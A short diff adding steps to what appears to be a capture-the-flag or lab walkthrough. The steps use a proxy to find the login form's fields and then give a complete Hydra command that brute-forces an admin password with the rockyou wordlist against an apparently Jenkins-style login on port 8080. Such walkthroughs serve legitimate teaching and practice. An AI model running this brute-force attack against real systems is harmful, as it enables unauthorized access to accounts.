@@ -31,3 +31,8 @@ User-agent: *
 Disallow: /
 ```
 
+- Use Hydra to brute force the admin password for the portal
+    - Use a proxy to find the format of the login page (Firefox or BurpSuite will work fine)
+        - Format is j_username=^USER^&j_password=^PASS^
+    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid" -s 8080`
+
